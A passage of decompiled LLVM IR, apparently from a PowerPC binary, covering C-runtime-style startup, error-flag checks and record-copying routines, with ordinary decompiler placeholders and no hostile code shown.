  %v2_10009790 = call i32 @function_1000a09c(i32 %v2_10009680, i32 %v2_10009680)
  store i32 %v2_10009790, i32* %r3.global-to-local, align 4
  store i32 %v2_10009790, i32* @r31, align 4
  %v0_10009798 = call i32 @function_10008484()
  store i32 %v0_10009798, i32* %r3.global-to-local, align 4
  store i32 %v0_10009798, i32* @r29, align 4
  %v1_100097a8 = inttoptr i32 %v0_10009798 to i32*
  %v2_100097a8 = load i32, i32* %v1_100097a8, align 4
  store i32 %v2_100097a8, i32* @r28, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268474292, i32* @lr, align 4
  %v3_100097b0 = call i32 @function_100080c0(i32 2, i32 %v2_100096c4, i32 0)
  store i32 %v3_100097b0, i32* %r3.global-to-local, align 4
  %v0_100097b4 = load i32, i32* @r28, align 4
  %v1_100097b4 = load i32, i32* @r29, align 4
  %v2_100097b4 = inttoptr i32 %v1_100097b4 to i32*
  store i32 %v0_100097b4, i32* %v2_100097b4, align 4
  %v0_100097e4.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_100097e4

dec_label_pc_100097bc:                            ; preds = %dec_label_pc_10009774
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268474316, i32* @lr, align 4
  %v3_100097c8 = call i32 @function_100080c0(i32 2, i32 %v2_100096c4, i32 0)
  br label %dec_label_pc_100097d8

dec_label_pc_100097d8:                            ; preds = %dec_label_pc_100096e0, %dec_label_pc_100097bc
  store i32 %v2_10009680, i32* %r3.global-to-local, align 4
  store i32 268474336, i32* @lr, align 4
  %v2_100097dc = call i32 @function_1000a09c(i32 %v2_10009680, i32 %v2_10009680)
  store i32 %v2_100097dc, i32* %r3.global-to-local, align 4
  store i32 %v2_100097dc, i32* @r31, align 4
  br label %dec_label_pc_100097e4

dec_label_pc_100097e4:                            ; preds = %dec_label_pc_10009788, %dec_label_pc_100097d8
  %v0_100097e4 = phi i32 [ %v0_100097e4.pr, %dec_label_pc_10009788 ], [ %v2_100097dc, %dec_label_pc_100097d8 ]
  %v3_100097e4 = icmp eq i32 %v0_100097e4, 0
  br i1 %v3_100097e4, label %dec_label_pc_10009810, label %dec_label_pc_100097ec

dec_label_pc_100097ec:                            ; preds = %dec_label_pc_100097e4
  %v3_100097fc = load i32, i32* %stack_var_-440, align 4
  %v0_10009800 = call i32 @__asm_mfcr()
  store i32 %v0_10009800, i32* %r3.global-to-local, align 4
  %v1_10009804 = call i32 @__asm_rlwinm(i32 %v0_10009800, i32 30, i32 31, i32 31)
  %v2_10009808 = add i32 %v3_100097fc, %v1_10009804
  store i32 %v2_10009808, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000981c

dec_label_pc_10009810:                            ; preds = %dec_label_pc_100097e4, %dec_label_pc_1000965c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000981c

dec_label_pc_10009818:                            ; preds = %dec_label_pc_100096c4, %dec_label_pc_10009720, %dec_label_pc_100096a0
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000981c

dec_label_pc_1000981c:                            ; preds = %dec_label_pc_10009810, %dec_label_pc_100097ec, %dec_label_pc_1000974c, %dec_label_pc_10009818
  %v0_1000982c = phi i32 [ 0, %dec_label_pc_10009810 ], [ %v2_10009808, %dec_label_pc_100097ec ], [ %v0_1000982c.pre, %dec_label_pc_1000974c ], [ -1, %dec_label_pc_10009818 ]
  ret i32 %v0_1000982c

; uselistorder directives
  uselistorder i32 %v1_1000971c, { 1, 0 }
  uselistorder i32 %v2_100096c4, { 2, 1, 3, 0, 5, 4, 6, 7 }
  uselistorder i32 %v1_1000969c, { 1, 0 }
  uselistorder i32 %v2_10009680, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 2, 7, 1, 8, 9, 10, 11, 12, 13, 15, 16, 14, 17, 18, 19, 20, 21, 22, 3, 23, 24, 0 }
  uselistorder i32* %r11.global-to-local, { 7, 6, 4, 0, 1, 9, 8, 5, 2, 3 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 4, 0, 1, 9, 8, 5, 2, 3 }
  uselistorder i32 (i32, i32)* @function_1000a09c, { 1, 0 }
  uselistorder i32 17, { 2, 23, 24, 3, 25, 4, 12, 13, 5, 6, 11, 14, 15, 7, 16, 8, 17, 9, 10, 18, 0, 19, 1, 20, 21, 22 }
  uselistorder label %dec_label_pc_1000981c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10009818, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100097e4, { 1, 0 }
  uselistorder label %dec_label_pc_100097d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000970c.dec_label_pc_1000970c_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000968c.dec_label_pc_1000968c_crit_edge, { 1, 0 }
}

define i32 @function_10009830(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009880:
  %v3_10009884 = load i32, i32* @global_var_1001b2b4.389, align 4
  %v3_10009888 = icmp eq i32 %v3_10009884, 0
  br i1 %v3_10009888, label %dec_label_pc_10009898, label %dec_label_pc_10009890

dec_label_pc_10009890:                            ; preds = %dec_label_pc_10009880
  %v2_10009894 = load i32, i32* @r4, align 4
  %v3_10009894 = call i32 @unknown_0(i32 268566528, i32 %v2_10009894)
  store i32 %v3_10009894, i32* @r3, align 4
  br label %dec_label_pc_10009898

dec_label_pc_10009898:                            ; preds = %dec_label_pc_10009880, %dec_label_pc_10009890
  %v3_1000989c = load i32, i32* @global_var_1001b2b8.390, align 4
  %v3_100098a0 = icmp eq i32 %v3_1000989c, 0
  br i1 %v3_100098a0, label %dec_label_pc_10009898.dec_label_pc_100098b0_crit_edge, label %dec_label_pc_100098a8

dec_label_pc_10009898.dec_label_pc_100098b0_crit_edge: ; preds = %dec_label_pc_10009898
  %v0_100098c0.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_100098b0

dec_label_pc_100098a8:                            ; preds = %dec_label_pc_10009898
  %v2_100098ac = load i32, i32* @r4, align 4
  %v3_100098ac = call i32 @unknown_0(i32 268566528, i32 %v2_100098ac)
  br label %dec_label_pc_100098b0

dec_label_pc_100098b0:                            ; preds = %dec_label_pc_10009898.dec_label_pc_100098b0_crit_edge, %dec_label_pc_100098a8
  %v0_100098c0 = phi i32 [ %v0_100098c0.pre, %dec_label_pc_10009898.dec_label_pc_100098b0_crit_edge ], [ %v3_100098ac, %dec_label_pc_100098a8 ]
  ret i32 %v0_100098c0

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100098b0, { 1, 0 }
  uselistorder label %dec_label_pc_10009898, { 1, 0 }
}

define i32 @function_100098c4() local_unnamed_addr {
dec_label_pc_100098c4:
  ret i32 0
}

define i32 @function_100098cc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100098cc:
  %v0_100098cc = load i32, i32* @r3, align 4
  ret i32 %v0_100098cc
}

define i32 @function_100098d0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_100098d0:
  store i32 %arg2, i32* @r30, align 4
  store i32 1, i32* @r4, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268474612, i32* @lr, align 4
  %v1_100098f0 = call i32 @function_10007c38(i32 1)
  %v3_100098f4 = icmp eq i32 %v1_100098f0, -1
  br i1 %v3_100098f4, label %dec_label_pc_100098fc, label %dec_label_pc_1000991c

dec_label_pc_100098fc:                            ; preds = %dec_label_pc_100098d0
  %v0_10009900 = load i32, i32* @r30, align 4
  store i32 268474640, i32* @lr, align 4
  %v3_1000990c = call i32 @function_10007ed0(i32 ptrtoint ([10 x i8]* @global_var_1000adf8.391 to i32), i32 %v0_10009900)
  %v1_10009910 = load i32, i32* @r31, align 4
  %v4_10009910 = icmp eq i32 %v3_1000990c, %v1_10009910
  br i1 %v4_10009910, label %dec_label_pc_1000991c, label %dec_label_pc_10009918

dec_label_pc_10009918:                            ; preds = %dec_label_pc_100098fc
  %v1_10009918 = call i32 @function_1000a4d0(i32 %v3_1000990c)
  br label %dec_label_pc_1000991c

dec_label_pc_1000991c:                            ; preds = %dec_label_pc_100098d0, %dec_label_pc_100098fc, %dec_label_pc_10009918
  %v0_1000992c = phi i32 [ %v1_100098f0, %dec_label_pc_100098d0 ], [ %v3_1000990c, %dec_label_pc_100098fc ], [ %v1_10009918, %dec_label_pc_10009918 ]
  ret i32 %v0_1000992c

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_10007ed0, { 0, 3, 8, 7, 1, 6, 5, 4, 2 }
  uselistorder i32 (i32)* @function_10007c38, { 0, 5, 9, 8, 11, 10, 7, 6, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_1000991c, { 2, 1, 0 }
}

define i32 @function_10009930(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009930:
  %v3_10009950 = load i32, i32* @global_var_1001b2bc.392, align 4
  %v3_10009954 = icmp eq i32 %v3_10009950, 0
  br i1 %v3_10009954, label %dec_label_pc_10009978, label %dec_label_pc_1000999c

dec_label_pc_10009978:                            ; preds = %dec_label_pc_10009930
  store i32 1, i32* @global_var_1001b2bc.392, align 4
  store i32 4096, i32* @global_var_1001b2b0.374, align 4
  br label %dec_label_pc_1000999c

dec_label_pc_1000999c:                            ; preds = %dec_label_pc_10009978, %dec_label_pc_10009930
  %v0_100099ac = load i32, i32* @r3, align 4
  ret i32 %v0_100099ac
}

define i32 @function_100099b0(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_100099b0:
  %r25.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_100099c8 = mul i32 %arg2, 4
  %v2_100099cc = add i32 %tmp, %v1_100099c8
  %v0_100099d0 = load i32, i32* @r9, align 4
  store i32 %v0_100099d0, i32* @global_var_1001b2a8.394, align 4
  %v1_100099d4 = add i32 %v2_100099cc, 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 %v1_100099d4, i32* @global_var_1001b2ac.395, align 4
  store i32 %arg6, i32* @global_var_1001b2b8.390, align 4
  store i32 %arg1, i32* %r25.global-to-local, align 4
  store i32 %arg4, i32* %r28.global-to-local, align 4
  %v2_100099f4 = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* %r27.global-to-local, align 4
  %v4_100099fc = icmp eq i32 %v1_100099d4, %v2_100099f4
  br i1 %v4_100099fc, label %dec_label_pc_10009a04, label %dec_label_pc_10009a08

dec_label_pc_10009a04:                            ; preds = %dec_label_pc_100099b0
  store i32 %v2_100099cc, i32* @global_var_1001b2ac.395, align 4
  br label %dec_label_pc_10009a08

dec_label_pc_10009a08:                            ; preds = %dec_label_pc_100099b0, %dec_label_pc_10009a04
  %v2_10009a08 = ptrtoint i32* %stack_var_-168 to i32
  store i32 268474904, i32* @lr, align 4
  %v3_10009a14 = call i32 @function_10008608(i32 %v2_10009a08, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_1001b2ac.395, align 4
  br label %dec_label_pc_10009a24

dec_label_pc_10009a24:                            ; preds = %dec_label_pc_10009a24, %dec_label_pc_10009a08
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_10009a08 ], [ %v1_10009a28, %dec_label_pc_10009a24 ]
  %v1_10009a24 = inttoptr i32 %storemerge to i32*
  %v2_10009a24 = load i32, i32* %v1_10009a24, align 4
  %v1_10009a28 = add i32 %storemerge, 4
  %v3_10009a2c = icmp eq i32 %v2_10009a24, 0
  br i1 %v3_10009a2c, label %dec_label_pc_10009a34, label %dec_label_pc_10009a24

dec_label_pc_10009a34:                            ; preds = %dec_label_pc_10009a24
  store i32 %v1_10009a28, i32* %r29.global-to-local, align 4
  %v1_10009a6012 = inttoptr i32 %v1_10009a28 to i32*
  %v2_10009a6013 = load i32, i32* %v1_10009a6012, align 4
  %v3_10009a6416 = icmp eq i32 %v2_10009a6013, 0
  br i1 %v3_10009a6416, label %dec_label_pc_10009a6c, label %dec_label_pc_10009a3c

dec_label_pc_10009a3c:                            ; preds = %dec_label_pc_10009a34, %dec_label_pc_10009a5c
  %v0_10009a50 = phi i32 [ %v1_10009a5c, %dec_label_pc_10009a5c ], [ %v1_10009a28, %dec_label_pc_10009a34 ]
  %v0_10009a44 = phi i32 [ %v2_10009a60, %dec_label_pc_10009a5c ], [ %v2_10009a6013, %dec_label_pc_10009a34 ]
  %v2_10009a3c = icmp ugt i32 %v0_10009a44, 14
  br i1 %v2_10009a3c, label %dec_label_pc_10009a5c, label %dec_label_pc_10009a44

dec_label_pc_10009a44:                            ; preds = %dec_label_pc_10009a3c
  %v1_10009a44 = mul i32 %v0_10009a44, 8
  %v2_10009a4c = add i32 %v1_10009a44, %v2_10009a08
  store i32 %v2_10009a4c, i32* @r3, align 4
  store i32 %v0_10009a50, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268474972, i32* @lr, align 4
  %v0_10009a58 = call i32 @function_100084c8()
  %v0_10009a5c.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10009a5c

dec_label_pc_10009a5c:                            ; preds = %dec_label_pc_10009a3c, %dec_label_pc_10009a44
  %v0_10009a5c = phi i32 [ %v0_10009a50, %dec_label_pc_10009a3c ], [ %v0_10009a5c.pre, %dec_label_pc_10009a44 ]
  %v1_10009a5c = add i32 %v0_10009a5c, 8
  store i32 %v1_10009a5c, i32* %r29.global-to-local, align 4
  %v1_10009a60 = inttoptr i32 %v1_10009a5c to i32*
  %v2_10009a60 = load i32, i32* %v1_10009a60, align 4
  %v3_10009a64 = icmp eq i32 %v2_10009a60, 0
  br i1 %v3_10009a64, label %dec_label_pc_10009a6c, label %dec_label_pc_10009a3c

dec_label_pc_10009a6c:                            ; preds = %dec_label_pc_10009a5c, %dec_label_pc_10009a34
  %v1_10009a70 = call i32 @function_1000a620(i32 %v2_10009a08)
  store i32 %v1_10009a70, i32* @r3, align 4
  store i32 268475000, i32* @lr, align 4
  %v1_10009a74 = call i32 @function_10009930(i32 %v1_10009a70)
  %v3_10009a7c = icmp eq i32 %tmp27, 0
  br i1 %v3_10009a7c, label %dec_label_pc_10009a84, label %dec_label_pc_10009a88

dec_label_pc_10009a84:                            ; preds = %dec_label_pc_10009a6c
  br label %dec_label_pc_10009a88

dec_label_pc_10009a88:                            ; preds = %dec_label_pc_10009a6c, %dec_label_pc_10009a84
  %v0_10009a90 = phi i32 [ %tmp27, %dec_label_pc_10009a6c ], [ 4096, %dec_label_pc_10009a84 ]
  store i32 %v0_10009a90, i32* @global_var_1001b2b0.374, align 4
  %v3_10009a94 = icmp eq i32 %tmp26, -1
  br i1 %v3_10009a94, label %dec_label_pc_10009a9c, label %dec_label_pc_10009ad0

dec_label_pc_10009a9c:                            ; preds = %dec_label_pc_10009a88
  store i32 268475040, i32* @lr, align 4
  %v1_10009a9c = call i32 @function_10009fd4(i32 268566528)
  store i32 %v1_10009a9c, i32* %r29.global-to-local, align 4
  store i32 268475048, i32* @lr, align 4
  %v0_10009aa4 = call i32 @function_10009f44()
  %v4_10009aa8 = icmp eq i32 %v1_10009a9c, %v0_10009aa4
  br i1 %v4_10009aa8, label %dec_label_pc_10009ab0, label %dec_label_pc_10009aec

dec_label_pc_10009ab0:                            ; preds = %dec_label_pc_10009a9c
  store i32 268475060, i32* @lr, align 4
  %v1_10009ab0 = call i32 @function_10009f8c(i32 %v0_10009aa4)
  store i32 %v1_10009ab0, i32* %r29.global-to-local, align 4
  store i32 268475068, i32* @lr, align 4
  %v0_10009ab8 = call i32 @function_10009efc()
  %v4_10009abc = icmp eq i32 %v1_10009ab0, %v0_10009ab8
  br i1 %v4_10009abc, label %dec_label_pc_10009ac4.thread, label %dec_label_pc_10009aec

dec_label_pc_10009ac4.thread:                     ; preds = %dec_label_pc_10009ab0
  br label %dec_label_pc_10009b1c

dec_label_pc_10009ad0:                            ; preds = %dec_label_pc_10009a88
  %v4_10009ad4 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_10009ad4, label %dec_label_pc_10009adc, label %dec_label_pc_10009aec

dec_label_pc_10009adc:                            ; preds = %dec_label_pc_10009ad0
  br label %dec_label_pc_10009aec

dec_label_pc_10009aec:                            ; preds = %dec_label_pc_10009adc, %dec_label_pc_10009ad0, %dec_label_pc_10009ab0, %dec_label_pc_10009a9c
  store i32 268475132, i32* @lr, align 4
  %v2_10009af8 = call i32 @function_100098d0(i32 0, i32 32768)
  store i32 268475148, i32* @lr, align 4
  %v2_10009b08 = call i32 @function_100098d0(i32 1, i32 32770)
  store i32 268475164, i32* @lr, align 4
  %v2_10009b18 = call i32 @function_100098d0(i32 2, i32 32770)
  br label %dec_label_pc_10009b1c

dec_label_pc_10009b1c:                            ; preds = %dec_label_pc_10009ac4.thread, %dec_label_pc_10009aec
  %v0_10009b28 = load i32, i32* @r30, align 4
  %v1_10009b28 = inttoptr i32 %v0_10009b28 to i32*
  %v2_10009b28 = load i32, i32* %v1_10009b28, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_10009b28, i32* inttoptr (i32 268546684 to i32*), align 4
  %v0_10009b48 = load i32, i32* %r27.global-to-local, align 4
  store i32 %v0_10009b48, i32* @global_var_1001b2b4.389, align 4
  br i1 false, label %dec_label_pc_10009b50, label %dec_label_pc_10009bc8

dec_label_pc_10009b50:                            ; preds = %dec_label_pc_10009b1c, %dec_label_pc_10009b50
  br i1 undef, label %dec_label_pc_10009b50, label %dec_label_pc_10009bc8

dec_label_pc_10009bc8:                            ; preds = %dec_label_pc_10009b50, %dec_label_pc_10009b1c
  %v0_10009b74 = load i32, i32* %r28.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_10009b74)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10009bd8 = call i32 @function_10008484()
  %v2_10009be0 = inttoptr i32 %v0_10009bd8 to i32*
  store i32 0, i32* %v2_10009be0, align 4
  %v0_10009c0c = load i32, i32* %r25.global-to-local, align 4
  call void @__pseudo_call(i32 %v0_10009c0c)
  %v0_10009c18 = call i32 @function_100095d8()
  ret i32 %v0_10009c18

; uselistorder directives
  uselistorder i32 %v2_10009a60, { 1, 0 }
  uselistorder i32 %v1_10009a5c, { 2, 1, 0 }
  uselistorder i32 %v1_10009a28, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_10009a08, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 7, 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i1 false, { 0, 5, 6, 2, 7, 8, 9, 10, 13, 11, 12, 3, 4, 1 }
  uselistorder i32 (i32, i32)* @function_100098d0, { 2, 1, 0 }
  uselistorder i32 4096, { 1, 3, 4, 0, 8, 5, 9, 6, 10, 7, 2 }
  uselistorder i32 14, { 19, 0, 8, 4, 5, 6, 7, 9, 10, 1, 11, 12, 13, 2, 14, 15, 16, 17, 18, 3 }
  uselistorder label %dec_label_pc_10009b50, { 1, 0 }
  uselistorder label %dec_label_pc_10009b1c, { 1, 0 }
  uselistorder label %dec_label_pc_10009a88, { 1, 0 }
  uselistorder label %dec_label_pc_10009a5c, { 1, 0 }
  uselistorder label %dec_label_pc_10009a3c, { 1, 0 }
  uselistorder label %dec_label_pc_10009a08, { 1, 0 }
}

define i32 @function_10009c1c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009c1c:
  %r31.global-to-local = alloca i32, align 4
  %v0_10009c34 = call i32 @__asm_mfcr()
  %v1_10009c38 = and i32 %v0_10009c34, 268435456
  %v3_10009c38 = icmp eq i32 %v1_10009c38, 0
  store i32 %v0_10009c34, i32* %r31.global-to-local, align 4
  br i1 %v3_10009c38, label %dec_label_pc_10009c50, label %dec_label_pc_10009c44

dec_label_pc_10009c44:                            ; preds = %dec_label_pc_10009c1c
  %v0_10009c44 = call i32 @function_10008484()
  %v0_10009c48 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009c48 = inttoptr i32 %v0_10009c44 to i32*
  store i32 %v0_10009c48, i32* %v2_10009c48, align 4
  br label %dec_label_pc_10009c50

dec_label_pc_10009c50:                            ; preds = %dec_label_pc_10009c1c, %dec_label_pc_10009c44
  %v0_10009c60 = phi i32 [ %v0_10009c34, %dec_label_pc_10009c1c ], [ -1, %dec_label_pc_10009c44 ]
  ret i32 %v0_10009c60

; uselistorder directives
  uselistorder label %dec_label_pc_10009c50, { 1, 0 }
}

define i32 @function_10009c64(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009c64:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_10009c78

dec_label_pc_10009c78:                            ; preds = %dec_label_pc_10009c78.backedge, %dec_label_pc_10009c64
  %v0_10009c84 = call i32 @__asm_mfcr()
  %v1_10009c88 = and i32 %v0_10009c84, 268435456
  %v3_10009c88 = icmp eq i32 %v1_10009c88, 0
  store i32 %v0_10009c84, i32* %r31.global-to-local, align 4
  br i1 %v3_10009c88, label %dec_label_pc_10009c78.backedge, label %dec_label_pc_10009c94

dec_label_pc_10009c94:                            ; preds = %dec_label_pc_10009c78
  %v0_10009c94 = call i32 @function_10008484()
  %v0_10009c98 = load i32, i32* %r31.global-to-local, align 4
  %v2_10009c98 = inttoptr i32 %v0_10009c94 to i32*
  store i32 %v0_10009c98, i32* %v2_10009c98, align 4
  br label %dec_label_pc_10009c78.backedge

dec_label_pc_10009c78.backedge:                   ; preds = %dec_label_pc_10009c94, %dec_label_pc_10009c78
  br label %dec_label_pc_10009c78
}

define i32 @function_10009ca0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10009ca0:
  %stack_var_-104 = alloca i32, align 4
  %v2_10009cac = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_10009cac, i32* @r29, align 4
  %v0_10009cb4 = load i32, i32* @r4, align 4
  store i32 %v0_10009cb4, i32* @r30, align 4
  %v0_10009cc4 = call i32 @__asm_mfcr()
  %v1_10009cc8 = and i32 %v0_10009cc4, 268435456
  %v3_10009cc8 = icmp eq i32 %v1_10009cc8, 0
  store i32 -1, i32* @r28, align 4
  store i32 %v0_10009cc4, i32* @r31, align 4
  br i1 %v3_10009cc8, label %dec_label_pc_10009ce4, label %dec_label_pc_10009cd8

dec_label_pc_10009cd8:                            ; preds = %dec_label_pc_10009ca0
  %v0_10009cd8 = call i32 @function_10008484()
  %v0_10009cdc = load i32, i32* @r31, align 4
  %v2_10009cdc = inttoptr i32 %v0_10009cd8 to i32*
  store i32 %v0_10009cdc, i32* %v2_10009cdc, align 4
  br label %dec_label_pc_10009cfc

dec_label_pc_10009ce4:                            ; preds = %dec_label_pc_10009ca0
  %v3_10009ce4 = icmp eq i32 %v0_10009cc4, 0
  store i32 %v0_10009cc4, i32* @r28, align 4
  br i1 %v3_10009ce4, label %dec_label_pc_10009cf8, label %dec_label_pc_10009cfc

dec_label_pc_10009cf8:                            ; preds = %dec_label_pc_10009ce4
  %v0_10009cec = load i32, i32* @r30, align 4
  store i32 268475644, i32* @lr, align 4
  %v4_10009cf8 = call i32 @function_1000a268(i32* nonnull %stack_var_-104, i32 %v0_10009cec, i32 0)
  br label %dec_label_pc_10009cfc

dec_label_pc_10009cfc:                            ; preds = %dec_label_pc_10009ce4, %dec_label_pc_10009cd8, %dec_label_pc_10009cf8
  %v0_10009d00 = load i32, i32* @r28, align 4
  ret i32 %v0_10009d00

; uselistorder directives
  uselistorder i32 %v0_10009cc4, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10009cfc, { 2, 0, 1 }
}

define i32 @function_10009d14(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10009d14:
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v0_10009d28 = call i32 @function_10009da4()
  store i32 %v0_10009d28, i32* @r30, align 4
  %tmp18 = icmp slt i32 %v0_10009d28, 1
  br i1 %tmp18, label %dec_label_pc_10009d8c, label %dec_label_pc_10009d34

dec_label_pc_10009d34:                            ; preds = %dec_label_pc_10009d14
  %v0_10009d34 = load i32, i32* @r31, align 4
  %v2_10009d34 = add i32 %v0_10009d34, %v0_10009d28
  store i32 %v2_10009d34, i32* %r29.global-to-local, align 4
  %v2_10009d7c3 = icmp ult i32 %v0_10009d34, %v2_10009d34
  br i1 %v2_10009d7c3, label %dec_label_pc_10009d3c, label %dec_label_pc_10009d8c

dec_label_pc_10009d3c:                            ; preds = %dec_label_pc_10009d34, %dec_label_pc_10009d3c
  %v1_10009d4c = phi i32 [ %v2_10009d78, %dec_label_pc_10009d3c ], [ %v0_10009d34, %dec_label_pc_10009d34 ]
  %v1_10009d8010.in = phi i32 [ %v2_10009d78, %dec_label_pc_10009d3c ], [ %v0_10009d34, %dec_label_pc_10009d34 ]
  %v1_10009d8411.in = phi i32 [ %v2_10009d78, %dec_label_pc_10009d3c ], [ %v0_10009d34, %dec_label_pc_10009d34 ]
  %v1_10009d8010 = add i32 %v1_10009d8010.in, 11
  %v1_10009d8411 = add i32 %v1_10009d8411.in, 19
  %v1_10009d3c = add i32 %v1_10009d4c, 4
  %v2_10009d3c = inttoptr i32 %v1_10009d3c to i32*
  %v3_10009d3c = load i32, i32* %v2_10009d3c, align 4
  store i32 %v3_10009d3c, i32* %r11.global-to-local, align 4
  %v1_10009d40 = add i32 %v1_10009d4c, 12
  %v2_10009d40 = inttoptr i32 %v1_10009d40 to i32*
  %v3_10009d40 = load i32, i32* %v2_10009d40, align 4
  %v1_10009d44 = add i32 %v1_10009d4c, 16
  %v2_10009d44 = inttoptr i32 %v1_10009d44 to i16*
  %v3_10009d44 = load i16, i16* %v2_10009d44, align 2
  %v4_10009d44 = zext i16 %v3_10009d44 to i32
  store i32 %v4_10009d44, i32* %r5.global-to-local, align 4
  %v1_10009d48 = add i32 %v1_10009d4c, 18
  %v2_10009d48 = inttoptr i32 %v1_10009d48 to i8*
  %v3_10009d48 = load i8, i8* %v2_10009d48, align 1
  %v4_10009d48 = zext i8 %v3_10009d48 to i32
  store i32 %v4_10009d48, i32* %r9.global-to-local, align 4
  store i32 %v3_10009d40, i32* %v2_10009d3c, align 4
  %v0_10009d50 = load i32, i32* %r11.global-to-local, align 4
  %v1_10009d50 = load i32, i32* @r31, align 4
  %v2_10009d50 = inttoptr i32 %v1_10009d50 to i32*
  store i32 %v0_10009d50, i32* %v2_10009d50, align 4
  %v0_10009d54 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009d54 = trunc i32 %v0_10009d54 to i8
  %v2_10009d54 = load i32, i32* @r31, align 4
  %v3_10009d54 = add i32 %v2_10009d54, 10
  %v4_10009d54 = inttoptr i32 %v3_10009d54 to i8*
  store i8 %v1_10009d54, i8* %v4_10009d54, align 1
  %v0_10009d58 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009d58 = trunc i32 %v0_10009d58 to i16
  %v2_10009d58 = load i32, i32* @r31, align 4
  %v3_10009d58 = add i32 %v2_10009d58, 8
  %v4_10009d58 = inttoptr i32 %v3_10009d58 to i16*
  store i16 %v1_10009d58, i16* %v4_10009d58, align 2
  %v0_10009d5c = load i32, i32* %r5.global-to-local, align 4
  %v1_10009d5c = add i32 %v0_10009d5c, -19
  store i32 %v1_10009d5c, i32* %r5.global-to-local, align 4
  store i32 268475748, i32* @lr, align 4
  %v3_10009d60 = call i32 @function_10008564(i32 %v1_10009d8010, i32 %v1_10009d8411, i32 %v1_10009d5c)
  %v0_10009d64 = load i32, i32* @r31, align 4
  %v1_10009d64 = add i32 %v0_10009d64, 8
  %v2_10009d64 = inttoptr i32 %v1_10009d64 to i16*
  %v3_10009d64 = load i16, i16* %v2_10009d64, align 2
  %v4_10009d64 = zext i16 %v3_10009d64 to i32
  store i32 %v4_10009d64, i32* %r5.global-to-local, align 4
  store i32 268475764, i32* @lr, align 4
  %v3_10009d70 = call i32 @function_10008564(i32 %v0_10009d64, i32 %v0_10009d64, i32 %v4_10009d64)
  %v0_10009d74 = load i32, i32* @r31, align 4
  %v1_10009d74 = add i32 %v0_10009d74, 8
  %v2_10009d74 = inttoptr i32 %v1_10009d74 to i16*
  %v3_10009d74 = load i16, i16* %v2_10009d74, align 2
  %v4_10009d74 = zext i16 %v3_10009d74 to i32
  %v2_10009d78 = add i32 %v4_10009d74, %v0_10009d74
  store i32 %v2_10009d78, i32* @r31, align 4
  %v1_10009d7c = load i32, i32* %r29.global-to-local, align 4
  %v2_10009d7c = icmp ult i32 %v2_10009d78, %v1_10009d7c
  br i1 %v2_10009d7c, label %dec_label_pc_10009d3c, label %dec_label_pc_10009d7c.dec_label_pc_10009d8c.loopexit_crit_edge

dec_label_pc_10009d7c.dec_label_pc_10009d8c.loopexit_crit_edge: ; preds = %dec_label_pc_10009d3c
  %v0_10009d90.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10009d8c

dec_label_pc_10009d8c:                            ; preds = %dec_label_pc_10009d34, %dec_label_pc_10009d7c.dec_label_pc_10009d8c.loopexit_crit_edge, %dec_label_pc_10009d14
